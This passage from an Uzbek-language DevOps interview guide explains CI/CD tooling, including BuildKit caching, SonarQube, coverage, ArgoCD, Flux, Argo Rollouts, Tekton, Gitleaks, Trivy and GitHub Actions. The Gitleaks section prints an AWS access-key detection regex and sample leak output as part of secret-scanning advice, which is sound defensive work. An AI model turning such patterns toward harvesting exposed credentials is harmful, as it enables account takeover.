- Build ichida vaqt, hostname, random yozish — reproducibility buziladi.

**Senior nuqta:** Hermeticity SLSA L3+ va xavfsizlik uchun asos: ikki mustaqil build bir xil digest bersa, build serveri buzilmaganini isbotlaydi. To'liq hermetiklik qimmat — Bazel/Nix; amalda lockfile + pinned image + private proxy ko'p foyda beradi.

40585.a:
**Qisqa javob:** BuildKit layer caching — Docker image build'ida o'zgarmagan layer'larni qayta build qilmaslik. Ephemeral CI runner'larda lokal cache yo'qoladi, shuning uchun cache registry'ga (`type=registry`) yoki GHA cache'ga (`type=gha`) eksport qilinib, keyingi build'da import qilinadi.

**Muammo:** Har CI run toza VM — `npm ci` va `go mod download` har safar noldan, build 8 daqiqa. Cache bilan — 1 daqiqa.

**Qanday ishlaydi:**
```
Dockerfile qatorlari = layer'lar, har birining cache key'i (instruction + input hash)
FROM golang:1.23         cache hit
COPY go.mod go.sum ./    hit (lockfile o'zgarmagan)
RUN go mod download      hit  <- eng qimmati tejaldi
COPY . .                 MISS (kod o'zgardi)
RUN go build             MISS
bir layer miss bo'lsa -> keyingi hammasi miss
```

**Amalda:**
```yaml
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    push: true
    tags: ghcr.io/acme/api:${{ github.sha }}
    cache-from: type=registry,ref=ghcr.io/acme/api:buildcache
    cache-to: type=registry,ref=ghcr.io/acme/api:buildcache,mode=max
```
`mode=max` — multi-stage'ning oraliq stage'larini ham saqlaydi. Muqobil: `type=gha` (GitHub cache, 10 GB limit). Dependency cache uchun: `RUN --mount=type=cache,target=/root/.cache/go-build go build ...`.

**Tuzoqlar:**
- `COPY . .` dependency o'rnatishdan oldin — har kod o'zgarishida cache yo'qoladi. Avval lockfile, keyin kod.
- `.dockerignore` yo'q — `.git` o'zgarishi cache'ni buzadi.
- `RUN apt-get update` cache'dan kelib eskirgan paketlar — xavfsizlik yangilanishi kirmaydi; vaqti-vaqti bilan `--no-cache` rebuild.

**Senior nuqta:** Dockerfile tartibi = cache strategiyasi: kam o'zgaradigan narsalar tepada. Cache'ni ham supply-chain qismi deb qara — PR'lar `main` cache'iga yozmasin.

40586.a:
**Qisqa javob:** Quality Gate — SonarQube'da kod sifati shartlari to'plami (masalan: yangi kodda coverage >= 80%, yangi bug/zaiflik = 0, duplication < 3%). Tahlil natijasi shartlardan o'tmasa — gate "Failed", CI va PR merge bloklanadi.

**Nega kerak:** "Sifatli kod yozamiz" — kelishuv; Quality Gate — uni avtomatik majburlovchi mexanizm. Review'da odam ko'rmaydigan narsalarni (coverage tushishi, takror kod) tool ushlaydi.

**Qanday ishlaydi:**
```
CI: test + coverage -> sonar-scanner -> SonarQube server (tahlil)
                                             |
                       Quality Gate shartlari "New Code" bo'yicha
                                             |
                    PASSED -> merge mumkin | FAILED -> PR'da qizil status
```

**Amalda:**
Default "Sonar way" gate (yangi kod uchun): 0 yangi issue, barcha security hotspot'lar ko'rib chiqilgan, coverage >= 80%, duplication <= 3%.
```bash
sonar-scanner \
  -Dsonar.projectKey=acme-api \
  -Dsonar.go.coverage.reportPaths=coverage.out \
  -Dsonar.qualitygate.wait=true \
  -Dsonar.qualitygate.timeout=300
# Quality Gate status: FAILED -> exit code 1
```

**"Clean as You Code" g'oyasi:** shartlar butun kodga emas, faqat yangi kodga qo'llanadi — eski qarz merge'ni bloklamaydi, lekin yangisi qo'shilmaydi.

**Tuzoqlar:**
- Butun kod bo'yicha coverage >= 80% sharti eski loyihada — hamma PR qizil, gate o'chiriladi.
- Coverage'ni ko'tarish uchun assertion'siz test yozish.
- `qualitygate.wait` yo'q — scanner yuklaydi, lekin pipeline natijani kutmaydi.

**Senior nuqta:** Gate shartlarini kam va ma'noli qil (zaiflik, bug, yangi kod coverage); qolganini ma'lumot sifatida ko'rsat. Gate bloklasa, uni chetlab o'tish jarayoni ham aniq bo'lsin (kim, qachon, nega).

40587.a:
**Qisqa javob:** Code coverage — test'lar ishlaganda source kodning qancha qismi bajarilganini ko'rsatuvchi foiz: line, branch, function coverage. U "qaysi kod umuman test qilinmagan" ni ko'rsatadi, lekin test sifatini o'lchamaydi.

**Muhim farq:**
```
func Discount(p int, vip bool) int {
    if vip {           // branch: true / false
        return p * 90 / 100
    }
    return p
}
test: Discount(100, true)  -> line coverage 66%, branch 50%
assertion yo'q bo'lsa ham coverage bir xil!
```

**Turlari:**
| Tur | Nimani o'lchaydi |
|---|---|
| Line/statement | Bajarilgan qatorlar |
| Branch | `if`/`switch` har yo'nalishi |
| Function | Chaqirilgan funksiyalar |
| Condition (MC/DC) | Har shart alohida (aviatsiya standartlari) |

**Amalda:**
```bash
go test -coverprofile=coverage.out -covermode=atomic ./...
go tool cover -func=coverage.out | tail -1
# total: (statements) 74.3%
go tool cover -html=coverage.out     # qizil qatorlar = test qilinmagan

pytest --cov=app --cov-branch --cov-report=xml --cov-fail-under=70
npx jest --coverage
```
CI'da `coverage.xml` ni Codecov/SonarQube'ga yuborib PR'da "bu PR coverage'ni -2.1% tushirdi" ko'rsatiladi.

**Tuzoqlar:**
- 100% maqsad — getter va trivial kod uchun test, muhim edge case'lar baribir yo'q.
- Coverage KPI bo'lsa — assertion'siz test'lar (Goodhart qonuni).
- Integration test coverage'ini hisobga olmaslik (Go 1.20+ `go build -cover` bilan binary coverage mumkin).

**Senior nuqta:** Coverage'ni pastki chegara sifatida emas, "ko'rinmas joylar xaritasi" sifatida ishlat. Kritik modullarda branch coverage va mutation testing; diff coverage (faqat yangi kod) global foizdan foydaliroq.

40588.a:
**Qisqa javob:** Pipeline as Code — CI/CD pipeline UI'da qo'lda sozlanmaydi, balki repo ichidagi faylda kod sifatida yoziladi: `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`. Pipeline ham kod kabi versiyalanadi, review qilinadi va branch'ga qarab o'zgaradi.

**Muammo:** UI'da sozlangan Jenkins job: kim o'zgartirgani noma'lum, orqaga qaytarib bo'lmaydi, server o'lsa — hammasi yo'qoladi, yangi branch uchun nusxa qo'lda.

**Qanday ishlaydi:**
```
repo/
  src/...
  .github/workflows/ci.yml   <- pipeline ta'rifi kod bilan birga
push -> CI shu commit'dagi pipeline faylini o'qiydi -> bajaradi
feature branch pipeline'ni o'zgartirsa -> faqat o'sha branch'da sinaladi
```

**Amalda:**
```yaml
# .github/workflows/ci.yml
name: ci
on: [pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
```
```groovy
// Jenkinsfile
pipeline {
  agent { label 'linux' }
  stages {
    stage('Test') { steps { sh 'make test' } }
  }
}
```

**Afzalliklari:** Git tarixi = audit; PR review pipeline o'zgarishiga ham; rollback = `git revert`; takrorlanadigan qismlar reusable workflow / shared library / `include` bilan.

**Tuzoqlar:**
- Pipeline faylini istalgan kishi o'zgartira oladi — PR'dan secret o'g'irlash yoki deploy qadamini o'chirish. CODEOWNERS bilan `.github/workflows/` ni himoyala.
- 1000 qatorlik YAML ichida bash — test qilinmaydi. Mantiqni `Makefile`/skriptga chiqar, YAML faqat orkestratsiya.
- Har repo'da nusxa — reusable shablonlarga o'tkaz.

**Senior nuqta:** Pipeline'ni lokal ishga tushiriladigan qil (`make ci`, `act`, `gitlab-ci-local`) — CI vendor'ga bog'liqlik kamayadi va debug tezlashadi.

40589.a:
**Qisqa javob:** Monorepo'da har commit'da hamma narsani build/test qilish juda sekin. Strategiya: o'zgargan fayllarni aniqlash -> dependency graph orqali ta'sirlangan paketlarni topish -> faqat ularni build/test qilish, natijalarni cache'lash (Nx, Turborepo, Bazel, Pants).

**Muammo:** 50 servisli monorepo, bitta README o'zgardi — 50 servis 40 daqiqa test qilinadi. Yoki aksincha: faqat `services/api` test qilinadi, lekin u ishlatadigan `libs/auth` o'zgargani e'tibordan chetda qoladi.

**Qanday ishlaydi:**
```
o'zgargan: libs/auth/token.go
dependency graph:
  libs/auth <- services/api
            <- services/billing
  libs/log  <- hammasi
affected = { libs/auth, services/api, services/billing } -> faqat shular
remote cache: hash(input) mos -> natijani yuklab ol, qayta ishlatma
```

**Amalda:**
```bash
npx nx affected -t test --base=origin/main --head=HEAD
npx turbo run test --filter='...[origin/main]'
bazel test $(bazel query 'rdeps(//..., set(//libs/auth:all))')
```
Oddiy variant — GitHub Actions path filter:
```yaml
on:
  pull_request:
    paths: ['services/api/**', 'libs/auth/**']
```
Yoki `dorny/paths-filter` bilan job darajasida shartlar.

**Tuzoqlar:**
- Path filter'lar qo'lda — `libs/` dependency'si unutiladi, buzuq kod merge bo'ladi.
- Required status check + path filter: job ishlamasa PR "kutayotgan" holatda qotadi (skip bo'lgan job required bo'lsa).
- Shallow clone (`fetch-depth: 1`) — base commit yo'q, diff hisoblanmaydi.
- Root config (`go.mod`, `package.json`) o'zgarsa — hamma narsa affected bo'lishi kerak.

**Senior nuqta:** Graph-aware tool + remote cache monorepo CI'ni masshtablaydi; path filter faqat kichik repo uchun. Vaqti-vaqti bilan (nightly) to'liq build qil — graph xatolarini ushlash uchun.

40590.a:
**Qisqa javob:** Pull-through cache — tashkilot ichidagi registry (Harbor proxy cache, ECR pull through cache, Artifactory, Nexus) tashqi registry (Docker Hub, ghcr.io, quay.io) uchun proksi bo'ladi: image birinchi so'rovda tashqaridan olinib saqlanadi, keyingilari lokal cache'dan beriladi.

**Muammo:** Docker Hub anonymous pull limiti (IP bo'yicha soatiga cheklangan) — NAT ortidagi 100 ta CI runner limitga darhol uriladi: `toomanyrequests: You have reached your pull rate limit`. Docker Hub ishlamasa — build va deploy to'xtaydi. Har pull tashqi trafik (NAT gateway narxi).

**Qanday ishlaydi:**
```
runner/k8s node -> harbor.internal/dockerhub-proxy/library/nginx:1.27
                       |
                cache'da bormi? -- ha --> darhol qaytar
                       | yo'q
                       v
              registry-1.docker.io -> olib, saqlab, qaytar
```

**Amalda:**
```bash
# AWS ECR pull through cache qoidasi
aws ecr create-pull-through-cache-rule \
  --ecr-repository-prefix dockerhub \
  --upstream-registry-url registry-1.docker.io \
  --credential-arn arn:aws:secretsmanager:...:secret:ecr-pullthroughcache/dockerhub

docker pull 123456789012.dkr.ecr.eu-central-1.amazonaws.com/dockerhub/library/nginx:1.27
```
containerd darajasida mirror (`/etc/containerd/certs.d/docker.io/hosts.toml`) — image nomlarini o'zgartirmasdan:
```toml
server = "https://registry-1.docker.io"
[host."https://harbor.internal/v2/dockerhub-proxy"]
  capabilities = ["pull", "resolve"]
```

**Tuzoqlar:**
- Cache'dagi image'lar eskiradi — `latest` kabi tag'lar upstream'da yangilangan bo'lishi mumkin.
- Cache'ga zaif image kiradi — proksi'da ham skanerlash (Harbor + Trivy).
- Upstream credential'siz proksi ham limitga uriladi — autentifikatsiyalangan hisob ber.

**Senior nuqta:** Pull-through cache — ishonchlilik (tashqi bog'liqlik ajratiladi), tezlik va narx masalasi. Prod uchun undan ham qat'iyrog'i: kerakli image'larni ichki registry'ga mirror qilib, faqat tasdiqlangan (skanerlangan, imzolangan) image'larga ruxsat berish.

40591.a:
**Qisqa javob:** Automated Canary Analysis — canary versiyaning metrikalarini (error rate, latency, CPU) bir vaqtda ishlayotgan baseline bilan statistik solishtiradigan avtomatik jarayon. Natija "pass" bo'lsa rollout davom etadi, "fail" bo'lsa avtomatik rollback.

**Muammo:** Qo'lda canary: muhandis Grafana'ga 10 daqiqa qaraydi, "yaxshiga o'xshaydi" deydi. Subyektiv, sekin, tunda hech kim qaramaydi.

**Qanday ishlaydi:**
```
stable (v1, 90%)   baseline (v1, 5%, yangi pod'lar)   canary (v2, 5%)
                         |                              |
                     metrikalar ------- solishtirish ---+
                         (Mann-Whitney U yoki threshold)
                         score: 92/100 -> pass (chegara 80)
```
Baseline nega kerak: canary yangi pod (cold cache) — eski uzoq ishlagan pod'lar bilan solishtirish adolatsiz; baseline ham yangi pod'lar, faqat eski versiya.

**Amalda (Argo Rollouts AnalysisTemplate):**
```yaml
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata: { name: success-rate }
spec:
  metrics:
    - name: success-rate
      interval: 1m
      count: 5
      failureLimit: 1
      successCondition: result[0] >= 0.99
      provider:
        prometheus:
          address: http://prometheus:9090
          query: |
            sum(rate(http_requests_total{app="api",role="canary",code!~"5.."}[2m]))
            / sum(rate(http_requests_total{app="api",role="canary"}[2m]))
```
Kayenta (Spinnaker/Netflix) — statistik baseline vs canary solishtirish uchun klassik vosita.

**Tuzoqlar:**
- Trafik kam — statistik ahamiyat yo'q; yolg'on pass yoki fail.
- Faqat texnik metrikalar — biznes metrika (checkout conversion) tushishi ko'rinmaydi.
- Metrika label'larida canary/stable ajratilmagan — solishtirib bo'lmaydi.

**Senior nuqta:** Analiz metrikalari SLO bilan mos bo'lsin. Analizning o'zi xato qilsa (Prometheus ishlamasa) — "inconclusive" holatda to'xtash, avtomatik davom etmaslik kerak.

40592.a:
**Qisqa javob:** Flagger — CNCF (Flux oilasi) Kubernetes operatori: oddiy Deployment uchun progressive delivery (canary, A/B, blue-green) ni avtomatlashtiradi. Trafikni service mesh yoki ingress (Istio, Linkerd, NGINX, Contour, Gateway API) orqali bosqichma-bosqich o'tkazadi va Prometheus metrikalariga qarab davom etadi yoki rollback qiladi.

**Argo Rollouts'dan farqi:** Flagger mavjud `Deployment` ni o'zgartirmasdan ishlaydi (alohida `Canary` CR), Flux GitOps bilan tabiiy juftlik. Argo Rollouts — `Deployment` o'rniga `Rollout` CR va ArgoCD bilan yaqin.

**Qanday ishlaydi:**
```
Deployment api (image o'zgardi)
     v
Flagger: api-primary (stable) + api-canary
     v
trafik: 0% -> 10% -> 20% ... -> 50% (har interval metrika tekshiruvi)
     v
OK -> canary image primary'ga ko'chiriladi, canary 0 ga scale
FAIL (threshold marta) -> rollback, trafik 100% primary
```

**Amalda:**
```yaml
apiVersion: flagger.app/v1beta1
kind: Canary
metadata: { name: api }
spec:
  targetRef: { apiVersion: apps/v1, kind: Deployment, name: api }
  service: { port: 8080 }
  analysis:
    interval: 1m
    threshold: 5
    maxWeight: 50
    stepWeight: 10
    metrics:
      - name: request-success-rate
        thresholdRange: { min: 99 }
        interval: 1m
      - name: request-duration
        thresholdRange: { max: 500 }
        interval: 1m
    webhooks:
      - name: load-test
        url: http://flagger-loadtester/
        metadata: { cmd: "hey -z 1m -q 10 http://api-canary:8080/" }
```
```bash
kubectl describe canary api   # Events: Advance api.prod canary weight 20
```

**Tuzoqlar:**
- Trafik bo'lmasa metrika yo'q — load tester webhook qo'sh.
- HPA bilan ishlatganda `autoscalerRef` ni ko'rsatish kerak.
- Service nomlari Flagger tomonidan boshqariladi — o'zing `api-primary` Service yaratma.

**Senior nuqta:** Flagger yoki Argo Rollouts tanlovi asosan GitOps tool'iga bog'liq (Flux vs ArgoCD). Muhimi — rollout qarorini metrikaga topshirish va rollback'ni tezkor sinab ko'rish.

40593.a:
**Qisqa javob:** Argo Rollouts — Kubernetes controller va `Rollout` CRD: standart Deployment'ning rolling update'i o'rniga canary, blue-green, trafik ulushini boshqarish, avtomatik metrika analizi (AnalysisTemplate) va pauza/promote/abort imkonini beradi.

**Muammo:** Kubernetes Deployment faqat rolling update biladi: foiz bo'yicha trafik bo'lish, metrikaga qarab to'xtash, bir zumda rollback yo'q.

**Qanday ishlaydi:**
```
Rollout (spec Deployment'ga o'xshash + strategy)
  -> ReplicaSet stable, ReplicaSet canary
  -> trafik routing: Istio/NGINX/ALB/Gateway API (aniq foiz)
  -> steps: setWeight -> pause -> analysis -> ...
  -> AnalysisRun (Prometheus/Datadog/Job) -> Successful | Failed -> abort
```

**Amalda:**
```yaml
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata: { name: api }
spec:
  replicas: 10
  selector: { matchLabels: { app: api } }
  template: { ... Deployment pod template bilan bir xil ... }
  strategy:
    blueGreen:
      activeService: api-active
      previewService: api-preview
      autoPromotionEnabled: false
      prePromotionAnalysis:
        templates: [ { templateName: smoke-test } ]
```
```bash
kubectl argo rollouts get rollout api -w
kubectl argo rollouts promote api
kubectl argo rollouts abort api
kubectl argo rollouts undo api
```
Mavjud Deployment'ni ko'chirmasdan `workloadRef` bilan ulash mumkin.

**Tuzoqlar:**
- Trafik routing sozlanmagan canary — faqat replika nisbati (aniq emas).
- ArgoCD'da Rollout pauza holatida "Progressing/Suspended" — buni xato deb o'ylash.
- HPA va `setWeight` — canary replika soni HPA bilan to'qnashmasligi uchun `setCanaryScale`.

**Senior nuqta:** Argo Rollouts'ning qiymati — rollout qarorini insondan metrikaga ko'chirish. Analizni avval "dry-run" rejimda ishlatib, threshold'larni real ma'lumotda sozla, keyin bloklovchi qil.

40595.a:
**Qisqa javob:** ArgoCD — Kubernetes uchun GitOps CD tool'i (CNCF graduated): `Application` resursida Git repo/path va maqsad klaster ko'rsatiladi; ArgoCD Git'dagi desired state'ni klasterdagi live state bilan doimiy solishtiradi, farqni (OutOfSync) ko'rsatadi va sync qiladi. Kuchli Web UI'ga ega.

**Qanday ishlaydi:**
```
Git repo (Helm/Kustomize/YAML)
     v  (har 3 daqiqa yoki webhook)
repo-server: manifestlarni render qiladi
     v
application-controller: desired vs live diff
     |-- Synced / OutOfSync
     |-- Healthy / Progressing / Degraded
     v
sync (auto yoki qo'lda) -> kube-apiserver
```

**Amalda:**
```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: { name: api-prod, namespace: argocd }
spec:
  project: prod
  source:
    repoURL: https://github.com/acme/gitops
    path: apps/api/overlays/prod
    targetRevision: main
  destination:
    server: https://kubernetes.default.svc
    namespace: api
  syncPolicy:
    automated: { prune: true, selfHeal: true }
    syncOptions: [ CreateNamespace=true ]
```
```bash
argocd app get api-prod
argocd app diff api-prod
argocd app sync api-prod
argocd app history api-prod && argocd app rollback api-prod 12
```
Ko'p ilova/klaster uchun: App-of-Apps yoki `ApplicationSet` (git, cluster, PR generator'lar).

**Tuzoqlar:**
- `prune: true` — Git'dan o'chirilgan resurs klasterdan ham o'chadi (PVC ham!). Kerak bo'lsa `Prune=false` annotation.
- `selfHeal` — HPA o'zgartirgan `replicas` bilan doimiy kurash; manifestdan `replicas` ni olib tashla yoki `ignoreDifferences`.
- `AppProject` cheklovlarisiz — har jamoa istalgan namespace'ga deploy qiladi.

**Senior nuqta:** ArgoCD'ni SSO + RBAC + AppProject bilan multi-tenant qil; o'zini ham GitOps bilan boshqar. Sync wave va hook'lar bilan tartibni (CRD -> operator -> app) boshqar.

40596.a:
**Qisqa javob:** Flux (FluxCD) — CNCF graduated GitOps toolkit: alohida controller'lar to'plami (source, kustomize, helm, notification, image automation). Git yoki OCI manbadan klaster holatini avtomatik sinxronlaydi. ArgoCD'dan farqi — UI'siz, to'liq Kubernetes-native (hammasi CRD va `kubectl`/`flux` CLI orqali).

**Qanday ishlaydi:**
```
GitRepository / OCIRepository / HelmRepository   (source-controller: artifact oladi)
        v
Kustomization  (kustomize-controller: apply, prune, health check)
HelmRelease    (helm-controller: helm install/upgrade)
        v
klaster
ImageRepository + ImagePolicy + ImageUpdateAutomation:
   registry'da yangi tag -> Git'ga commit (avtomatik image yangilash)
```

**Amalda:**
```bash
flux bootstrap github --owner=acme --repository=fleet \
  --branch=main --path=clusters/prod --personal=false
```
```yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata: { name: api, namespace: flux-system }
spec:
  interval: 5m
  path: ./apps/api/prod
  prune: true
  sourceRef: { kind: GitRepository, name: fleet }
  healthChecks:
    - { apiVersion: apps/v1, kind: Deployment, name: api, namespace: api }
```
```bash
flux get kustomizations
flux reconcile kustomization api --with-source
flux logs --level=error
```

**ArgoCD vs Flux:**
| | ArgoCD | Flux |
|---|---|---|
| UI | Bor, kuchli | Yo'q (Weave GitOps/Headlamp plugin) |
| Model | Application CR | Modulli controller'lar |
| Image auto-update | Image Updater (alohida) | Ichida |
| Multi-tenancy | AppProject | Namespace + service account |

**Tuzoqlar:**
- `prune: true` bilan noto'g'ri path — resurslar o'chiriladi.
- Kustomization'lar orasidagi tartib — `dependsOn` qo'yilmasa CRD'dan oldin CR apply bo'ladi.
- Bootstrap token'ini keng huquq bilan qoldirish.

**Senior nuqta:** Platforma jamoasi UI'ni kamroq ishlatsa va hammasi kod orqali bo'lsa — Flux; dasturchilarga vizual ko'rinish muhim bo'lsa — ArgoCD. Ikkalasi ham Flagger/Argo Rollouts bilan progressive delivery qiladi.

40597.a:
**Qisqa javob:** Tekton — Kubernetes'da CI/CD pipeline qurish uchun ochiq kodli framework (CD Foundation): `Task`, `Pipeline`, `TaskRun`, `PipelineRun` CRD'lari orqali. Har Task — pod, har step — konteyner. Tayyor mahsulot emas, platforma qurish uchun "qurilish bloki" (OpenShift Pipelines asosi).

**Qanday ishlaydi:**
```
Pipeline: clone -> test -> build-image -> deploy
   |         |        |          |
PipelineRun yaratiladi -> har Task = alohida Pod
   Task pod: step1 (container) -> step2 (container) ...
   Task'lar orasida ma'lumot: Workspace (PVC) va Results
Tekton Triggers: webhook -> EventListener -> PipelineRun
Tekton Chains: TaskRun natijalarini imzolab SLSA provenance yaratadi
```

**Amalda:**
```yaml
apiVersion: tekton.dev/v1
kind: Task
metadata: { name: go-test }
spec:
  workspaces: [ { name: source } ]
  steps:
    - name: test
      image: golang:1.23
      workingDir: $(workspaces.source.path)
      script: |
        go test ./...
---
apiVersion: tekton.dev/v1
kind: Pipeline
metadata: { name: ci }
spec:
  workspaces: [ { name: src } ]
  tasks:
    - name: clone
      taskRef: { resolver: hub, params: [ {name: name, value: git-clone} ] }
      workspaces: [ { name: output, workspace: src } ]
    - name: test
      runAfter: [clone]
      taskRef: { name: go-test }
      workspaces: [ { name: source, workspace: src } ]
```
```bash
tkn pipeline start ci -w name=src,volumeClaimTemplateFile=pvc.yaml --showlog
tkn pipelinerun logs -f
```

**Tuzoqlar:**
- Ko'p YAML va past darajali — kichik jamoa uchun GitHub Actions/GitLab ancha sodda.
- Workspace PVC'lar — sekin (attach) va tozalanmasa to'planadi.
- UI cheklangan (Tekton Dashboard) — dasturchi tajribasi zaif.

**Senior nuqta:** Tekton — o'z ichki CI platformasini Kubernetes ustida qurayotgan platforma jamoalari uchun; Chains orqali supply-chain xavfsizligi kuchli. Oddiy ehtiyojga managed CI arzonroq.

40598.a:
**Qisqa javob:** Spinnaker — Netflix yaratgan (keyin Google bilan ochiq kodli qilingan) multi-cloud continuous delivery platformasi: AWS, GCP, Azure, Kubernetes bo'ylab murakkab deploy pipeline'lar, ichki canary analiz (Kayenta), manual judgment bosqichlari va "immutable infrastructure" deploy strategiyalari (red/black, highlander).

**Qanday ishlaydi:**
```
trigger (Jenkins build, image push, cron, Git)
   v
pipeline: Bake (AMI/manifest) -> Deploy staging -> Manual Judgment
        -> Canary Analysis (Kayenta) -> Deploy prod (red/black) -> Destroy old
mikroservislar: Deck (UI), Gate (API), Orca (orkestratsiya),
                Clouddriver (cloud'lar bilan ishlash), Echo, Igor, Front50 ...
```

**Amalda:** Pipeline'lar UI'da yoki JSON/"pipeline templates" (dinghy, spin CLI) orqali:
```bash
spin pipeline save --file deploy-api.json
spin pipeline execute --name deploy-api --application api
```
Deploy strategiyalari:
| Strategiya | Ma'nosi |
|---|---|
| Red/Black | blue-green ning Netflix nomi |
| Highlander | yangisi chiqqach eskilar hammasi o'chadi |
| Rolling red/black | bosqichma-bosqich |

**Holati (2025-2026):** Hali ishlatiladi (Netflix, katta korxonalar, Armory/Harness tijorat tarqatmalari), lekin yangi Kubernetes-markazli loyihalarda odatda ArgoCD/Flux + Argo Rollouts/Flagger tanlanadi.

**Tuzoqlar:**
- Operatsion og'ir: ~10 mikroservis, Redis, SQL — o'zini boshqarish uchun alohida jamoa kerak.
- UI'da qo'lda yaratilgan pipeline'lar — versiyalanmaydi (Pipeline as Code buziladi).
- Kubernetes uchun GitOps bilan qatlamlar takrorlanadi.

**Senior nuqta:** Spinnaker ko'p cloud va VM (AMI) asosidagi deploy'lar, murakkab approval va canary kerak bo'lgan yirik tashkilotlar uchun mantiqli. Kubernetes-only muhitda soddaroq GitOps stack kamroq operatsion xarajat beradi.

40599.a:
**Qisqa javob:** Gitleaks — Git repo, commit tarixi va fayllarda oqib ketgan secret'larni (API kalit, token, private key, parol) regex va entropiya qoidalari bilan topuvchi ochiq kodli tez skaner. Pre-commit hook'da (oqishdan oldin) va CI'da (o'tib ketganini ushlash) ishlatiladi.

**Muammo:** Dasturchi `.env` yoki `config.go` dagi AWS kalitni commit qildi. Public repo'da bot'lar uni daqiqalarda topadi. Faylni keyingi commit'da o'chirish yetmaydi — tarixda qoladi.

**Qanday ishlaydi:**
```
commit/diff -> qoidalar (aws-access-key: AKIA[0-9A-Z]{16}, entropiya)
            -> topildi: fayl, qator, commit, rule-id
            -> exit code 1 -> commit/PR bloklanadi
```

**Amalda:**
```bash
gitleaks git -v .                    # butun tarix
gitleaks git --log-opts="origin/main..HEAD"   # faqat yangi commit'lar
gitleaks dir ./config                # oddiy papka
```
```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.21.2
    hooks: [ { id: gitleaks } ]
```
Chiqish:
```
Finding:  aws_access_key_id = "AKIA..."
RuleID:   aws-access-token
File:     deploy/config.env  Line: 3  Commit: 4f2a1c...
```
False positive uchun `.gitleaksignore` (fingerprint) yoki `.gitleaks.toml` allowlist.

**Secret topilsa nima qilish (tartib muhim):**
1. Darhol revoke/rotate — bu birinchi.
2. Keyin tarixdan tozalash (`git filter-repo`) — ixtiyoriy, chunki nusxalar allaqachon bor.
3. Audit log'larni tekshirish: ishlatilganmi?

**Tuzoqlar:**
- Faqat tarixdan o'chirib, kalitni rotate qilmaslik.
- Pre-commit hook majburiy emas (`--no-verify`) — CI'da ham shart.
- Alternativlar: TruffleHog (kalitni haqiqiyligini tekshiradi), GitHub push protection.

**Senior nuqta:** Eng yaxshi secret — repo'da umuman bo'lmagani: OIDC, Vault, secret manager. Skaner — xavfsizlik to'ri, asosiy yechim emas.

40600.a:
**Qisqa javob:** Trivy — Aqua Security'ning ochiq kodli, bitta binary'dagi keng qamrovli skaneri: container image va fayl tizimida CVE'lar (OS paketlari va til dependency'lari), IaC misconfiguration (Terraform, K8s, Dockerfile), secret'lar, litsenziyalar, SBOM yaratish, Kubernetes klasterini skanerlash.

**Qanday ishlaydi:**
```
target (image / fs / repo / k8s / sbom)
   -> paketlarni aniqlash (apk, dpkg, rpm, go.sum, package-lock ...)
   -> zaiflik bazasi (trivy-db, har 6 soatda yangilanadi)
   -> moslik: pkg@ver <-> CVE, fixed version
   -> hisobot (table, json, sarif, cyclonedx)
```

**Amalda:**
```bash
trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 ghcr.io/acme/api:1.4.2
trivy fs --scanners vuln,secret,misconfig .
trivy config ./terraform
trivy k8s --report summary cluster
trivy image --format cyclonedx -o sbom.json ghcr.io/acme/api:1.4.2
```
Chiqish:
```
ghcr.io/acme/api:1.4.2 (alpine 3.20.1)
Total: 2 (HIGH: 1, CRITICAL: 1)
| Library | Vulnerability  | Severity | Installed | Fixed  |
| openssl | CVE-2024-xxxxx | CRITICAL | 3.3.0-r2  | 3.3.1-r0 |
```
```yaml
- uses: aquasecurity/trivy-action@0.28.0
  with: { image-ref: 'ghcr.io/acme/api:${{ github.sha }}', severity: 'CRITICAL,HIGH', exit-code: '1', format: sarif, output: trivy.sarif }
```

**Tuzoqlar:**
- `--ignore-unfixed` siz — tuzatishi yo'q CVE'lar bilan pipeline doim qizil.
- Har job'da DB yuklash — rate limit; DB'ni cache'la yoki mirror (`--db-repository`) qil.
- Faqat build vaqtida skanerlash — 1 oydan keyin yangi CVE chiqadi; registry/klasterni muntazam qayta skanerla (Trivy Operator).
- `.trivyignore` ga sababsiz qo'shish.

**Senior nuqta:** Image'ni kichraytirish (distroless, scratch) CVE sonini triage'dan ko'ra samaraliroq kamaytiradi. Trivy'ni build gate + runtime monitoring sifatida ishlat, natijalarni VEX bilan "ta'sir qilmaydi" deb izohla.

40601.a:
**Qisqa javob:** GitHub Actions workflow — `.github/workflows/` papkasidagi YAML fayl bilan ta'riflangan avtomatik jarayon. U hodisa (`push`, `pull_request`, `schedule`, `workflow_dispatch`) bilan ishga tushadi va bir yoki bir nechta job'dan iborat; har job runner'da step'larni bajaradi.

**Tuzilma:**
```
workflow (ci.yml)
  on: hodisalar
  permissions / env / concurrency
  jobs:
    lint  (runner: ubuntu)  -> steps: checkout, run ...
    test  (needs: lint)     -> steps ...
    build (needs: test)     -> steps ...
```

**Amalda:**
```yaml
name: ci
on:
  push: { branches: [main] }
  pull_request:
  workflow_dispatch:
permissions: { contents: read }
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version-file: go.mod, cache: true }
      - run: go test -race ./...
```
Natija: repo -> Actions tab -> run -> job -> step log'lari. CLI: `gh run list`, `gh run watch`, `gh run view --log-failed`.

**Asosiy tushunchalar:**
| Tushuncha | Ma'nosi |
|---|---|
| Event | Nima ishga tushiradi |
| Job | Bitta runner'dagi step'lar |
| Step | `run:` (shell) yoki `uses:` (action) |
| Action | Qayta ishlatiladigan step (marketplace) |
| Runner | Bajaruvchi mashina |
| Context | `github`, `env`, `secrets`, `matrix` ... |

**Tuzoqlar:**
- `permissions` yo'q — default `GITHUB_TOKEN` keng huquqli bo'lishi mumkin.
- `timeout-minutes` yo'q — osilgan job 6 soat yeydi.
- Third-party action'lar `@main` bilan — har kuni boshqa kod.

**Senior nuqta:** Workflow'ni yupqa qil: mantiq `Makefile`/skriptda, YAML faqat trigger va orkestratsiya. Third-party action'larni commit SHA bilan pin qil.

